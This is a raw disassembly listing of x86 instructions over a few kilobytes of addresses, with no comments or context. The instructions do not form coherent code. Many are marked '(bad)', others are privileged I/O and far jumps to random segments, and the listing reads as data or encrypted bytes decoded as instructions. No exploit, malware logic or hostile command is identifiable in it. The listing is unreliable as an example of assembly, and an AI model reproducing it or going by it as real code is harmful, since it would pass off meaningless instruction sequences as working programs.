  423fdb:	(bad)  
  423fdc:	daa    
  423fdd:	dec    ebx
  423fde:	jmp    0x1006:0x3392fe97
  423fe5:	jecxz  0x424031
  423fe7:	in     eax,dx
  423fe8:	jle    0x423fe9
  423fea:	sahf   
  423feb:	mov    edx,0x9c79f99a
  423ff0:	shl    BYTE PTR [edi],1
  423ff2:	out    0x9c,al
  423ff4:	jge    0x423fb2
  423ff6:	jbe    0x42402b
  423ff8:	add    ebp,eax
  423ffa:	aam    0x1b
  423ffc:	pop    ebp
  423ffd:	cmp    eax,0xa2e83b66
  424002:	sbb    ah,BYTE PTR [edx]
  424004:	div    dh
  424006:	imul   esi,DWORD PTR [eax+0x53],0x37
  42400a:	gs and al,0x2
  42400d:	sub    bl,BYTE PTR [eax]
  42400f:	das    
  424010:	aam    0x8f
  424012:	scas   al,BYTE PTR es:[edi]
  424013:	fwait
  424014:	dec    eax
  424015:	and    BYTE PTR [ebp-0x31],cl
  424018:	or     bh,cl
  42401a:	hlt    
  42401b:	xchg   ebx,eax
  42401c:	mov    dh,0x5b
  42401e:	mov    BYTE PTR [ebx],cl
  424020:	clc    
  424021:	les    edx,FWORD PTR [edi-0x42]
  424024:	aad    0xd
  424026:	imul   ebx,DWORD PTR [ebx+0x43],0xdbea2c16
  42402d:	sub    eax,0xffffffb0
  424030:	repz (bad) 
  424032:	adc    ecx,ebx
  424034:	mov    bl,0xa1
  424036:	add    bh,BYTE PTR [ebx]
  424038:	adc    eax,0xcff1cd80
  42403d:	cmp    al,0xb9
  424040:	xlat   BYTE PTR ds:[ebx]
  424041:	adc    BYTE PTR [edx-0x4a],0xf4
  424045:	pop    esp
  424046:	fsubr  st(5),st
  424048:	js     0x42404b
  42404a:	das    
  42404b:	call   0x63b89fbe
  424050:	and    BYTE PTR [eax-0x565c413],dh
  424056:	imul   edi,DWORD PTR [edi+0x0],0xffffffa2
  42405a:	aas    
  42405b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42405c:	je     0x423ff8
  42405e:	add    al,0x96
  424060:	xchg   ebp,eax
  424061:	call   0x8858:0xc2fbab42
  424068:	test   DWORD PTR [esi-0x22fae556],ecx
  42406e:	dec    eax
  42406f:	and    eax,0xa91bf495
  424074:	pusha  
  424075:	or     eax,0xd097e8db
  42407a:	pop    esp
  42407b:	or     al,0x34
  42407d:	cmp    eax,0xea073e9d
  424082:	push   edi
  424083:	xor    ah,bh
  424085:	fmul   DWORD PTR [esi]
  424087:	mov    al,0x9c
  424089:	in     al,dx
  42408a:	loop   0x4240d7
  42408c:	in     al,0x4
  42408e:	sbb    al,0xf2
  424090:	loop   0x4240da
  424092:	dec    edi
  424093:	int3   
  424094:	rcl    DWORD PTR [edi-0x6f],0x0
  424098:	and    eax,0x9f51a0c6
  42409d:	push   ebp
  42409e:	xor    eax,0xbb7e84fc
  4240a3:	mov    ecx,0x2a42933b
  4240a8:	ins    DWORD PTR es:[edi],dx
  4240a9:	mov    ds:0x10cf012a,eax
  4240ae:	jno    0x424056
  4240b0:	push   ss
  4240b1:	push   0xfffffffc
  4240b3:	ficom  DWORD PTR [eax-0x69]
  4240b6:	(bad)  
  4240b7:	mov    edx,0x6064920b
  4240bc:	or     ch,BYTE PTR [edx-0x4d8f5a81]
  4240c2:	ss imul esi,edx,0x2f
  4240c6:	int    0x4f
  4240c8:	inc    eax
  4240c9:	or     DWORD PTR [ecx+0x3999c28a],0x20
  4240d0:	sbb    ebp,DWORD PTR [eax+0x29c092c2]
  4240d6:	adc    al,0x3e
  4240d8:	mov    cl,0x9
  4240da:	out    0x76,al
  4240dc:	js     0x424155
  4240de:	fld    TBYTE PTR [edx-0x14]
  4240e1:	xchg   BYTE PTR [ebp+edi*4-0x6b],ch
  4240e5:	popa   
  4240e6:	in     eax,dx
  4240e7:	shl    DWORD PTR [ecx],1
  4240e9:	lock std 
  4240eb:	sbb    BYTE PTR [ebx],dl
  4240ed:	jmp    0xfcbb:0xae4cb538
  4240f4:	inc    edx
  4240f5:	ss test bh,0x84
  4240f9:	add    eax,0x4715d94a
  4240fe:	jb     0x4240e4
  424100:	fcmovu st,st(4)
  424102:	xchg   DWORD PTR [edx-0x2fefa7d3],esi
  424108:	push   ss
  424109:	test   eax,0xed175085
  42410e:	pop    ecx
  42410f:	in     al,0x50
  424111:	sti    
  424112:	(bad)  [edx-0x3966d197]
  424118:	pop    es
  424119:	(bad)  
  42411a:	adc    eax,0x38e72ef5
  42411f:	push   ecx
  424120:	sti    
  424121:	test   esi,0x3e6d0807
  424127:	sbb    esi,edi
  424129:	int3   
  42412a:	sbb    BYTE PTR [eax+ebp*2],dh
  42412d:	jecxz  0x4240b6
  42412f:	sub    DWORD PTR [eax+edx*2+0x4a],ecx
  424133:	cmp    eax,0x5bfab620
  424138:	stc    
  424139:	dec    esp
  42413a:	fst    DWORD PTR [ebp+0x35]
  42413d:	ins    DWORD PTR es:[edi],dx
  42413e:	sub    BYTE PTR [edi+0x4df88167],dl
  424144:	adc    edx,DWORD PTR [ebx]
  424146:	jl     0x42416d
  424148:	add    esp,0xb2b630bd
  42414e:	add    BYTE PTR [eax+eax*8],al
  424151:	dec    ebx
  424152:	sbb    BYTE PTR [eax+ecx*8+0x38205159],al
  424159:	test   BYTE PTR [edi+0x7a19b51e],bl
  42415f:	pusha  
  424160:	pop    ds
  424161:	add    dh,BYTE PTR [ebx]
  424163:	in     al,0x2a
  424165:	sbb    al,0x7d
  424167:	mov    edi,0xd93e2d0d
  42416c:	out    dx,al
  42416d:	rcl    BYTE PTR [ecx+ebx*4-0x1c12e91f],0xc0
  424175:	pop    ss
  424176:	xchg   BYTE PTR [ebp-0x2a],al
  424179:	and    edx,edx
  42417b:	xchg   bh,dh
  42417d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42417e:	das    
  42417f:	add    ah,BYTE PTR [esi-0x7109a9f8]
  424185:	push   edi
  424186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424187:	test   BYTE PTR [esp+edi*8+0x7f],ch
  42418b:	test   al,0xaa
  42418d:	ds inc ebx
  42418f:	ja     0x424173
  424191:	pop    edi
  424192:	(bad)  
  424193:	in     eax,0xc9
  424195:	xchg   ebx,eax
  424196:	sbb    DWORD PTR ds:0x2aa6b125,0xfffffff3
  42419d:	add    ebx,DWORD PTR ss:[ecx+ecx*2]
  4241a1:	jno    0x42421f
  4241a3:	sbb    DWORD PTR [edi+ebx*8],esi
  4241a6:	imul   ebp,esi,0x4f514ea2
  4241ac:	fcomp  st(0)
  4241ae:	pusha  
  4241af:	rcl    DWORD PTR [esi],1
  4241b1:	out    0x76,al
  4241b3:	mov    dh,0xf6
  4241b5:	scas   eax,DWORD PTR es:[edi]
  4241b6:	sub    al,0x29
  4241b8:	bound  edi,QWORD PTR [esi-0x531bdc23]
  4241be:	es hlt 
  4241c0:	fsubr  DWORD PTR [edi]
  4241c2:	repz retfw 
  4241c5:	push   esp
  4241c6:	push   0x4caeaa39
  4241cb:	retf   
  4241cc:	hlt    
  4241cd:	jo     0x424216
  4241cf:	dec    esp
  4241d0:	bound  esi,QWORD PTR ds:0x1bed8e39
  4241d6:	or     al,0x4f
  4241d8:	or     al,0x2b
  4241da:	mov    DWORD PTR [esp+ebx*1],esp
  4241dd:	sbb    DWORD PTR [eax+esi*8-0x46],esp
  4241e1:	dec    eax
  4241e2:	dec    ebp
  4241e3:	sti    
  4241e4:	push   cs
  4241e5:	fwait
  4241e6:	jae    0x42418d
  4241e8:	add    bh,al
  4241ea:	mov    al,0x89
  4241ec:	xor    al,0x50
  4241ee:	outs   dx,BYTE PTR ds:[esi]
  4241ef:	iret   
  4241f0:	gs pop ebx
  4241f2:	sbb    eax,0x62b92bf1
  4241f7:	sub    BYTE PTR ds:0xa1616b54,al
  4241fd:	aad    0x21
  4241ff:	cwde   
  424200:	not    bh
  424202:	jae    0x4241e0
  424204:	or     eax,0xadc3c1ac
  424209:	(bad)  
  42420a:	cs call 0x99df45a7
  424210:	pop    es
  424211:	push   esp
  424212:	pushf  
  424213:	and    DWORD PTR [ebp-0x26ceb187],eax
  424219:	jmp    0x42421c
  42421b:	sbb    BYTE PTR [ecx-0x43c5f603],dl
  424221:	sbb    DWORD PTR [edi-0x63],ebx
  424224:	fimul  WORD PTR [edi-0x41]
  424227:	mov    gs,WORD PTR [ebp+0xa311221]
  42422d:	aam    0xcd
  42422f:	push   es
  424230:	int3   
  424231:	or     BYTE PTR [esi],al
  424233:	push   eax
  424234:	test   BYTE PTR [ebx],dh
  424236:	sub    DWORD PTR [edi],edi
  424238:	inc    edi
  424239:	jg     0x4241ca
  42423b:	aas    
  42423c:	ss pop eax
  42423e:	aad    0x5a
  424240:	(bad)  
  424241:	push   eax
  424242:	push   esi
  424243:	push   ss
  424244:	ret    
  424245:	jno    0x4241e3
  424247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424248:	sub    dl,BYTE PTR ds:0x2b2204b7
  42424e:	sbb    edx,DWORD PTR [eax]
  424250:	mov    bh,0xb2
  424252:	add    DWORD PTR [ebx-0x7048e47b],ecx
  424258:	sahf   
  424259:	outs   dx,DWORD PTR ds:[esi]
  42425a:	mov    dh,0x63
  42425c:	xor    BYTE PTR [edx-0x587004a5],dh
  424262:	lods   eax,DWORD PTR ds:[esi]
  424263:	out    0xaa,al
  424265:	mov    edx,0xf17574f6
  42426a:	sub    ebx,DWORD PTR [eax+0x2d]
  42426d:	mov    edx,0x43cde15e
  424272:	inc    edx
  424273:	mov    edx,0xaab061e5
  424278:	add    cl,BYTE PTR [edx+edx*2-0x141f821a]
  42427f:	sbb    eax,0xc49ec02f
  424284:	sub    al,0xd6
  424286:	or     edx,eax
  424288:	sar    dl,1
  42428a:	mov    dh,0xcd
  42428c:	dec    ecx
  42428d:	imul   ebx,DWORD PTR [ebx],0xffffffa0
  424290:	mov    esp,0xaab84b6
  424295:	mov    edx,0x4740aa09
  42429a:	jns    0x424278
  42429c:	fst    DWORD PTR [ebp+0x681b5f38]
  4242a2:	scas   al,BYTE PTR es:[edi]
  4242a3:	dec    edx
  4242a4:	sti    
  4242a5:	lds    esi,FWORD PTR [edx-0x24]
  4242a8:	retf   0x70a0
  4242ab:	enter  0x2330,0x73
  4242af:	xchg   cl,dl
  4242b1:	ss retf 
  4242b3:	jmp    DWORD PTR [edx]
  4242b5:	mov    ecx,0x80773922
  4242ba:	jae    0x42429d
  4242bc:	sub    eax,0x5ad87530
  4242c1:	(bad)  
  4242c2:	mov    edx,0x7e3e94e8
  4242c7:	scas   al,BYTE PTR es:[edi]
  4242c8:	adc    DWORD PTR [esi+ecx*4+0x56f681ce],eax
  4242cf:	push   esp
  4242d0:	mov    cl,0xb4
  4242d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d3:	cmp    al,0x8a
  4242d5:	repz ja 0x424258
  4242d8:	xchg   ebp,eax
  4242d9:	jne    0x424322
  4242db:	jp     0x424346
  4242dd:	inc    edx
  4242de:	push   0xd5ae6958
  4242e3:	out    0xd6,eax
  4242e5:	sub    edx,DWORD PTR [ebp+ebx*4+0x56]
  4242e9:	int3   
  4242ea:	repz test al,al
  4242ed:	addr16 nop
  4242ef:	popf   
  4242f0:	rcr    DWORD PTR [esi-0x393b89fc],1
  4242f6:	imul   edi,DWORD PTR ds:0xfda47520,0x6672e47f
  424300:	lods   eax,DWORD PTR ds:[esi]
  424301:	jnp    0x42434f
  424303:	(bad)  
  424304:	fldenv [ebp+0x48]
  424307:	jb     0x424294
  424309:	mov    BYTE PTR [eax+0x11146d3a],bl
  42430f:	mov    ah,0xdd
  424311:	mov    esi,0xdc271853
  424316:	fisub  WORD PTR [ebx+0x71]
  424319:	or     eax,DWORD PTR [eax-0x4ff1a5bc]
  42431f:	fs pop edi
  424321:	cli    
  424322:	xchg   edi,eax
  424323:	adc    al,bh
  424325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424326:	push   edx
  424327:	dec    edi
  424328:	cld    
  424329:	cmp    DWORD PTR [eax+0x53c9f7ff],edi
  42432f:	(bad)  
  424330:	shr    DWORD PTR [ebp+0x6f],cl
  424333:	mov    al,0x38
  424335:	dec    edx
  424336:	outs   dx,DWORD PTR ds:[esi]
  424337:	xchg   edi,esp
  424339:	jo     0x4242ef
  42433b:	adc    DWORD PTR [ecx+ebp*4-0x57],ebx
  42433f:	pop    ecx
  424340:	pop    ecx
  424341:	dec    eax
  424342:	cmp    DWORD PTR [ebx-0x2c],esp
  424345:	or     al,0x6a
  424347:	dec    ebp
  424348:	jbe    0x4243ad
  42434a:	mov    ecx,0xbb38d8a5
  42434f:	pusha  
  424350:	das    
  424351:	pop    ss
  424352:	cdq    
  424353:	xchg   edi,eax
  424354:	std    
  424355:	sub    esp,edx
  424357:	and    DWORD PTR [ebx+0x3d],edx
  42435a:	lods   eax,DWORD PTR ds:[esi]
  42435b:	or     eax,0xfb226f2d
  424360:	bnd call esp
  424363:	stos   DWORD PTR es:[edi],eax
  424364:	xor    eax,0xd5eb8ab5
  424369:	pop    edi
  42436a:	test   eax,0x34b0d7b9
  42436f:	sub    DWORD PTR ds:0xfd0c7733,edx
  424375:	mov    WORD PTR [ebp+0x1a],gs
  424378:	pop    edx
  424379:	mov    BYTE PTR [edx+0x25],bh
  42437c:	push   esi
  42437d:	loopne 0x4243e6
  42437f:	and    eax,0x960c7841
  424384:	inc    edi
  424385:	gs test eax,0x7affedd8
  42438b:	mov    esp,?
  42438d:	add    al,0x3a
  42438f:	dec    ebx
  424390:	mov    bh,0xf0
  424392:	jmp    0xfcb89b8
  424397:	push   esp
  424398:	xchg   ecx,eax
  424399:	jl     0x4243aa
  42439b:	inc    eax
  42439c:	cmc    
  42439d:	cmp    al,0xb3
  42439f:	jecxz  0x4243de
  4243a1:	sbb    DWORD PTR [edx],ebp
  4243a3:	scas   al,BYTE PTR es:[edi]
  4243a4:	mov    edx,0x82e6cf24
  4243a9:	fld    QWORD PTR [ecx+0x488004eb]
  4243af:	mov    al,ds:0xc2a4f2e4
  4243b4:	jl     0x4243a5
  4243b6:	fcom   DWORD PTR [ebx+0x2b]
  4243b9:	and    eax,0xaabb876c
  4243be:	bound  edx,QWORD PTR [edi+0x19]
  4243c1:	push   esi
  4243c2:	dec    edx
  4243c3:	mov    al,0xfa
  4243c5:	test   al,0x5d
  4243c7:	lock lock mov esp,0x7e22168e
  4243ce:	push   edi
  4243cf:	sar    BYTE PTR [edx-0x6],0xea
  4243d3:	and    bh,0xcd
  4243d6:	or     eax,0x38c4ba94
  4243db:	outs   dx,DWORD PTR ds:[esi]
  4243dc:	mov    edi,DWORD PTR [edx-0x57249dd8]
  4243e2:	vandnps xmm6,xmm4,XMMWORD PTR [ecx]
  4243e6:	cmp    al,0x5d
  4243e8:	xor    BYTE PTR [edx-0x1baf9d22],cl
  4243ee:	js     0x4243e1
  4243f0:	(bad)  
  4243f1:	fistp  DWORD PTR [ebx-0x44]
  4243f4:	test   al,0x67
  4243f6:	push   ecx
  4243f7:	inc    ebp
  4243f8:	cld    
  4243f9:	jne    0x424399
  4243fb:	ret    
  4243fc:	ret    
  4243fd:	dec    ecx
  4243fe:	and    eax,0xb5b3ebbd
  424403:	data16 (bad) 
  424405:	mov    dh,0x8b
  424407:	or     eax,DWORD PTR [edx]
  424409:	sub    al,0x2f
  42440b:	ins    BYTE PTR es:[edi],dx
  42440c:	add    eax,0x8cb7022c
  424411:	xlat   BYTE PTR ds:[ebx]
  424412:	xor    DWORD PTR [ecx],0xffffffae
  424415:	mov    WORD PTR [esi],cs
  424417:	add    BYTE PTR [eax+0x35],al
  42441a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42441c:	aaa    
  42441d:	in     al,dx
  42441e:	mov    cl,0xc1
  424420:	out    dx,al
  424421:	xor    bl,BYTE PTR [ecx+0x24]
  424424:	inc    ecx
  424425:	dec    edi
  424426:	jl     0x4243cf
  424428:	and    ch,BYTE PTR [esi+0x1d8a5901]
  42442e:	and    bh,al
  424430:	call   DWORD PTR [esi]
  424432:	fdivr  QWORD PTR [eax]
  424434:	mov    esi,0x2cb0648
  424439:	cmp    DWORD PTR [edi+0x198ab6a0],edi
  42443f:	loop   0x424434
  424441:	mov    ebp,0xffb35b62
  424446:	mov    al,0xe0
  424448:	mov    ?,WORD PTR [ecx+0x7f]
  42444b:	hlt    
  42444c:	push   0x7d7cf4e
  424451:	scas   eax,DWORD PTR es:[edi]
  424452:	retf   0x9dd3
  424455:	jecxz  0x424412
  424457:	xchg   ebx,eax
  424458:	aaa    
  424459:	dec    edi
  42445a:	xor    DWORD PTR [ecx-0x12],esi
  42445d:	ds repz loop 0x424446
  424461:	je     0x424424
  424463:	loopne 0x4244d6
  424465:	cvttps2pi mm0,QWORD PTR [ecx-0x5e]
  424469:	jo     0x4244ac
  42446b:	add    al,0x49
  42446d:	dec    ebx
  42446e:	pop    edi
  42446f:	jmp    0x4244ad
  424471:	sub    eax,0xd3bfe532
  424476:	mov    esp,DWORD PTR [edx-0x77]
  424479:	lsl    ebx,WORD PTR [eax-0x62]
  42447d:	aam    0x4e
  42447f:	and    DWORD PTR [esi+0x12d9c4b4],0x5b0d0408
  424489:	mov    ds:0x1bf6fa80,al
  42448e:	(bad)  
  42448f:	enter  0x3004,0x4d
  424493:	jo     0x4244cb
  424495:	cmp    al,0x4a
  424497:	pop    esp
  424498:	fsubr  st(6),st
  42449a:	pushf  
  42449b:	sub    BYTE PTR [eax],bl
  42449d:	jge    0x424428
  42449f:	xchg   BYTE PTR [eax-0xa60748d],ah
  4244a5:	and    ebp,eax
  4244a7:	enter  0xc739,0xf7
  4244ab:	arpl   bx,bp
  4244ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ae:	enter  0x105a,0xd
  4244b2:	dec    esi
  4244b3:	xor    al,BYTE PTR [ecx]
  4244b5:	push   eax
  4244b6:	push   ebp
  4244b7:	or     DWORD PTR [esi+edi*4-0x2c7e9fa6],ebx
  4244be:	sub    BYTE PTR [eax],0xd
  4244c1:	rol    BYTE PTR fs:0xb0cced91,cl
  4244c8:	ret    
  4244c9:	push   ecx
  4244ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244cb:	or     BYTE PTR [edi+ecx*8-0x28],cl
  4244cf:	call   0xc30c4a7c
  4244d4:	dec    eax
  4244d5:	push   ebx
  4244d6:	inc    ebx
  4244d7:	(bad)  [ebx-0x1]
  4244da:	and    DWORD PTR [ecx-0x85722b],0xcd73a798
  4244e4:	ss int 0x8b
  4244e7:	or     al,0x1b
  4244e9:	adc    edx,edx
  4244eb:	or     DWORD PTR [eax-0x641bcd30],edx
  4244f1:	test   ebp,ecx
  4244f3:	ins    DWORD PTR es:[edi],dx
  4244f4:	rcl    ch,1
  4244f6:	mov    ebp,0xb237042f
  4244fb:	push   esp
  4244fc:	test   eax,0x493caeea
  424501:	ret    
  424502:	das    
  424503:	push   ss
  424504:	cmc    
  424505:	lods   al,BYTE PTR ds:[esi]
  424506:	xchg   ecx,eax
  424507:	dec    esp
  424508:	not    BYTE PTR ds:0xb4df93b1
  42450e:	mov    cl,0x3d
  424510:	sub    esi,edi
  424512:	loope  0x4244cb
  424514:	or     ebx,DWORD PTR [eax]
  424516:	pop    ebx
  424517:	out    dx,eax
  424518:	fild   WORD PTR [edi+eiz*2+0x5a]
  42451c:	retf   
  42451d:	xor    al,0x86
  42451f:	sub    edx,DWORD PTR [ebp+edx*8+0x577a3d0d]
  424526:	addr16 gs leave 
  424529:	or     esp,DWORD PTR [edi-0x2c3b3145]
  42452f:	(bad)  
  424530:	push   eax
  424531:	mov    ebp,0xfd8288e4
  424536:	cwde   
  424537:	outs   dx,DWORD PTR ds:[esi]
  424538:	scas   eax,DWORD PTR es:[edi]
  424539:	in     eax,0x3c
  42453b:	and    DWORD PTR [edx],ebx
  42453d:	cs shl al,cl
  424540:	inc    edx
  424541:	jp     0x4245bc
  424543:	jae    0x4244d4
  424545:	call   0xa05b8702
  42454a:	push   0x0
	...
  424568:	add    BYTE PTR [eax],al
  42456a:	pop    edx
  42456b:	inc    esp
  42456c:	dec    esi
  42456d:	inc    ecx
  42456e:	pop    esi
  42456f:	dec    ebx
  424570:	pop    edi
  424571:	pop    edi
  424572:	inc    edx
  424573:	cwde   
  424574:	inc    esi
  424575:	loop   0x4245db
  424577:	or     eax,0xd245037a
  42457c:	add    DWORD PTR [eax],eax
  42457e:	mov    DWORD PTR [esi],eax
  424580:	add    BYTE PTR [eax],al
  424582:	arpl   WORD PTR [ecx],bp
  424584:	out    0xc7,al
  424586:	gs inc ebp
  424588:	sbb    ecx,DWORD PTR [eax]
  42458a:	jecxz  0x42454b
  42458c:	mov    eax,0xd790aea4
  424591:	jno    0x424587
  424593:	dec    ebp
  424594:	pop    ecx
  424595:	jno    0x42459e
  424597:	cmp    eax,0xba521fe7
  42459c:	es pop eax
  42459e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42459f:	mov    ds:0x923594dc,eax
  4245a4:	push   0x120e907b
  4245a9:	xor    eax,0xa97c9533
  4245ae:	add    al,0xc3
  4245b0:	sbb    DWORD PTR [ebp+0xf],edx
  4245b3:	sbb    cl,BYTE PTR [edx-0x104492ac]
  4245b9:	mov    al,0xcc
  4245bb:	dec    ebp
  4245bc:	int3   
  4245bd:	inc    esi
  4245be:	std    
  4245bf:	xchg   cl,dl
  4245c1:	push   ebp
  4245c2:	mov    al,0xd5
  4245c4:	and    BYTE PTR [edx+0x60],ch
  4245c7:	and    BYTE PTR [ecx+0x34],ch
  4245ca:	push   ebx
  4245cb:	or     BYTE PTR [ebp+ebp*1-0x58abfc18],ch
  4245d2:	cmp    al,0xb3
  4245d4:	(bad)  
  4245d5:	mov    cl,0x51
  4245d7:	shr    BYTE PTR [ebx+0xb],cl
  4245da:	and    eax,DWORD PTR [ebx+0x5f]
  4245dd:	cmp    BYTE PTR [eax+0x1],cl
  4245e0:	mov    esp,0xf09d0167
  4245e5:	in     al,dx
  4245e6:	adc    DWORD PTR [ecx+0xe],ebx
  4245e9:	in     al,0x6c
  4245eb:	xor    bl,dl
  4245ed:	pop    ebx
  4245ee:	and    dl,BYTE PTR [edx-0x48]
  4245f1:	jle    0x424605
  4245f3:	(bad)  
  4245f5:	or     eax,0x39f5420f
  4245fa:	sbb    eax,0xf81ee107
  4245ff:	popa   
  424600:	mov    ch,0x3e
  424602:	push   0x428272ee
  424607:	fnsave [ebx+0x1c]
  42460a:	out    dx,al
  42460b:	aas    
  42460c:	int3   
  42460d:	dec    ecx
  42460e:	test   BYTE PTR [eax+0x6f00dfcd],bl
  424614:	(bad)  
  424615:	shl    esp,cl
  424617:	hlt    
  424618:	enter  0x2795,0x6b
  42461c:	or     BYTE PTR [edx],0xdf
  42461f:	xchg   DWORD PTR [eax+edx*2+0x19c234d5],ebx
  424626:	pavgb  mm0,QWORD PTR [ebp+0x2d]
  42462a:	mov    al,0xc5
  42462c:	add    eax,0x10075a99
  424631:	and    BYTE PTR [edx-0x337b4384],cl
  424637:	sbb    DWORD PTR [ecx+0x6abd76a1],ebx
  42463d:	or     eax,0x3277de72
  424642:	and    BYTE PTR [ecx+0x22172093],cl
  424648:	inc    eax
  424649:	dec    ecx
  42464a:	push   ds
  42464b:	jno    0x424625
  42464d:	cmp    DWORD PTR [ecx-0x2f8aded9],0xfffffff5
  424654:	cs enter 0xb01c,0x98
  424659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42465a:	jb     0x4246cc
  42465c:	pop    esp
  42465d:	and    eax,0xc08da28d
  424662:	jbe    0x424614
  424664:	cmp    dh,BYTE PTR [ebx]
  424666:	bound  esp,QWORD PTR [edx]
  424668:	aad    0x7f
  42466a:	and    bh,BYTE PTR [edx-0x6e]
  42466d:	mov    ch,bl
  42466f:	and    BYTE PTR [esp+edi*2-0x50],dl
  424673:	sti    
  424674:	imul   esp,DWORD PTR [eax+0x57],0xffffff99
  424678:	pop    eax
  424679:	icebp  
  42467a:	add    dh,dh
  42467c:	leave  
  42467d:	jb     0x4246ee
  42467f:	sub    ebp,edi
  424681:	mov    esi,0xee784d4c
  424686:	mov    esp,ebp
  424688:	or     DWORD PTR [ecx+ebx*1+0x39332ec9],ecx
  42468f:	fdivr  QWORD PTR [eax+0x463eea2b]
  424695:	out    0x73,eax
  424697:	shl    edx,0x9e
  42469a:	mov    esi,0x8d8f0a5a
  42469f:	inc    edx
  4246a0:	xlat   BYTE PTR ds:[ebx]
  4246a1:	adc    BYTE PTR [edi],ah
  4246a3:	inc    edi
  4246a4:	mov    esp,0xb7a56a7c
  4246a9:	jecxz  0x4246f7
  4246ab:	and    edi,DWORD PTR [eax+0x2b]
  4246ae:	cld    
  4246af:	and    DWORD PTR [ebx],0x67
  4246b2:	push   ebx
  4246b3:	aaa    
  4246b4:	mov    al,ds:0x4cde4518
  4246b9:	icebp  
  4246ba:	leave  
  4246bb:	mov    bl,0x49
  4246bd:	loope  0x4246ec
  4246bf:	cmp    bh,dh
  4246c1:	adc    bh,ch
  4246c3:	pop    es
  4246c4:	aam    0x6c
  4246c6:	cmp    ch,ah
  4246c8:	popf   
  4246c9:	mov    eax,0x78a04a5a
  4246ce:	data16 jp 0x4246a7
  4246d1:	(bad)  
  4246d2:	push   ebp
  4246d3:	fadd   DWORD PTR [esi]
  4246d5:	lods   al,BYTE PTR ds:[esi]
  4246d6:	cmc    
  4246d7:	ins    BYTE PTR es:[edi],dx
  4246d8:	ins    BYTE PTR es:[edi],dx
  4246d9:	xlat   BYTE PTR ds:[ebx]
  4246da:	jns    0x42468f
  4246dc:	add    dh,cl
  4246de:	mov    DWORD PTR [eax-0x49c82590],edx
  4246e4:	nop
  4246e5:	or     eax,DWORD PTR [ebp-0x6ed7c985]
  4246eb:	test   edi,ebx
  4246ed:	mov    ds:0xc9b7f208,eax
  4246f2:	loope  0x424768
  4246f4:	inc    ebp
  4246f5:	or     BYTE PTR ds:0x63ff3f6a,ch
  4246fb:	mov    al,ds:0x4a46a572
  424700:	js     0x4246eb
  424702:	push   ebp
  424703:	call   0x7d4:0x7686c53a
  42470a:	cmc    
  42470b:	hlt    
  42470c:	push   ds
  42470d:	fcomi  st,st(0)
  42470f:	mov    WORD PTR [esi+eiz*4+0x42ed52f2],gs
  424716:	sar    edx,1
  424718:	push   ebx
  424719:	jmp    0xf1d9:0xdd55f3d2
  424720:	jno    0x424749
  424722:	rcl    al,0xa5
  424725:	pushf  
  424726:	or     eax,0x6d89e30b
  42472b:	fld    DWORD PTR [ebx+0x55]
  42472e:	fcomip st,st(6)
  424730:	xchg   dl,cl
  424732:	lahf   
  424733:	lock adc cl,al
  424736:	test   eax,0x5633909f
  42473b:	frstor [ecx+edi*4-0x15ddbca0]
  424742:	pop    ecx
  424743:	test   eax,0x5c64398e
  424748:	push   cs
  424749:	xor    cl,cl
  42474b:	dec    eax
  42474c:	dec    ebx
  42474d:	out    dx,al
  42474e:	or     bl,BYTE PTR [ebx]
  424750:	mov    ?,WORD PTR [esi+ebp*1-0xd9dd55d]
  424757:	inc    esp
  424758:	mov    BYTE PTR [edx+ecx*2],ch
  42475b:	or     al,ch
  42475d:	dec    edx
  42475e:	or     DWORD PTR [edi+0x6e6e066e],esi
  424764:	std    
  424765:	(bad)  
  424766:	cmp    ah,bl
  424768:	aad    0x40
  42476a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42476b:	mov    fs,WORD PTR [ebp+0x77]
  42476e:	fs aam 0x99
  424771:	(bad)  
  424772:	mov    eax,ds:0x4accfb01
  424777:	inc    ebp
  424778:	fwait
  424779:	out    0xf3,eax
  42477b:	xor    BYTE PTR [ebx+0x3b6481b1],ah
  424781:	push   ds
  424782:	pop    ecx
  424783:	(bad)  
  424784:	pop    ss
  424785:	(bad)  
  424786:	jg     0x42477e
  424788:	retf   
  424789:	jecxz  0x424783
  42478b:	pop    ecx
  42478c:	js     0x4247e5
  42478e:	and    BYTE PTR [eax+0x47c2f369],0xcd
  424795:	in     al,0x4a
  424797:	gs and al,0x5f
  42479a:	retf   
  42479b:	mov    al,ds:0x31361c57
  4247a0:	mov    dl,0x66
  4247a2:	es pop eax
  4247a4:	xor    ebp,DWORD PTR [ecx-0x62]
  4247a7:	and    al,0xcf
  4247a9:	and    ebx,eax
  4247ab:	aam    0xe8
  4247ad:	adc    bh,al
  4247af:	sub    esp,DWORD PTR [ebp+0x1d]
  4247b2:	fimul  WORD PTR [ebx]
  4247b4:	and    DWORD PTR [edx-0x3d],0xd85a2816
  4247bb:	or     eax,0x8a05ba02
  4247c0:	push   ss
  4247c1:	adc    eax,DWORD PTR [ebx]
  4247c3:	mov    esp,0x316c1b37
  4247c8:	and    BYTE PTR [ecx-0x3117ebc4],0x2f
  4247cf:	popa   
  4247d0:	jmp    0xb08e:0xfc8c4607
  4247d7:	or     BYTE PTR [edi],cl
  4247d9:	push   ebp
  4247da:	loopne 0x424778
  4247dc:	shl    BYTE PTR ds:0x657e8e62,cl
  4247e2:	fwait
  4247e3:	and    bl,BYTE PTR [ebx+0x6b]
  4247e6:	inc    esp
  4247e7:	mov    bh,0x3b
  4247e9:	dec    edx
  4247ea:	jb     0x4247a1
  4247ec:	add    al,0x23
  4247ee:	and    ebp,DWORD PTR [eax+0xe]
  4247f1:	daa    
  4247f2:	imul   eax,DWORD PTR [edx-0x10],0xffffffe0
  4247f6:	push   ecx
  4247f7:	stos   DWORD PTR es:[edi],eax
  4247f8:	test   DWORD PTR [eax+0x679c0b36],ebp
  4247fe:	clc    
  4247ff:	outs   dx,BYTE PTR ds:[esi]
  424800:	test   eax,0x7bc58a76
  424805:	into   
